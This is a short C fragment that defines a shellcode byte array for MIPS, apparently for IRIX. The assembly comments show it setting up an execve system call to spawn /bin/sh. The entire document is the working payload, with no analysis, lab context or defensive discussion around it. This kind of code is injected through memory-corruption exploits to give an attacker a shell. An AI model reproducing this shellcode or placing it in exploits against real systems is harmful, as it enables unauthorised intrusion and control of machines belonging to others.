char shellcode[]=
                      "\x04\x10\xff\xff"             /* bltzal  $zero,<_shellcode>    */
                      "\x24\x02\x03\xf3"             /* li      $v0,1011              */
                      "\x23\xff\x02\x14"             /* addi    $ra,$ra,532           */
                      "\x23\xe4\xfe\x08"             /* addi    $a0,$ra,-504          */
                      "\x23\xe5\xfe\x10"             /* addi    $a1,$ra,-496          */
                      "\xaf\xe4\xfe\x10"             /* sw      $a0,-496($ra)         */
                      "\xaf\xe0\xfe\x14"             /* sw      $zero,-492($ra)       */
                      "\xa3\xe0\xfe\x0f"             /* sb      $zero,-497($ra)       */
                      "\x03\xff\xff\xcc"             /* syscall                       */
                      "/bin/sh"
                   ;